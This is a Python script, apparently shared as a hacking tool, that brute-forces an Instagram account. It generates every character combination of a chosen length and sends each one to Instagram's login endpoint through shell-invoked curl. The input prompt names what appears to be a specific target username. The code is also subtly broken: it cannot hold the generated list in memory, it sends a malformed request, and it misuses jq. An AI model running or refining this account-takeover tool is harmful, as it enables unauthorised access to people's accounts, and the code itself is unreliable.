import itertools as HananAsif
import time
import subprocess
import json

# Generation of Different Combinations of Passwords
def generate_passwords(length, chars):
    return [''.join(p) for p in HananAsif.product(chars, repeat=length)]

# Brute Force Attack for Instagram
def brute_force_instagram(username, passwords):
    url = 'https://www.instagram.com/accounts/login/ajax/'

    for password in passwords:
        data = {
            'username': username,
            'password': password,
            'queryParams': '',
            'optIntoOneTap': 'false'
        }

        # Use curl to send POST request
        curl_command = f'curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "{json.dumps(data)}" {url}'
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)

        # Use jq to parse JSON response
        response_json = json.loads(subprocess.run(['jq', '.'], input=result.stdout, text=True).stdout)

        if 'authenticated' in response_json:
            print(f'Password found: {password}')
            return password

        # Rate limiting: Sleep for 1 second before the next request
        time.sleep(1)

    print('Password not found')
    return None

# Enter Username for Processing
def main():
    username = input(' miss_kitty63109: ')

    # Default character set including symbols and numbers
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'

    # Ask for password length
    length = int(input('Enter the length of the passwords to try (e.g., 8): '))

    # Generate passwords
    passwords = generate_passwords(length, chars)

    # Split passwords into chunks of 10,000
    for i in range(0, len(passwords), 10000):
        chunk = passwords[i:i + 10000]
        found_password = brute_force_instagram(username, chunk)
        if found_password:
            break

if __name__ == '__main__':
    main()

# Codded by Hanan Asif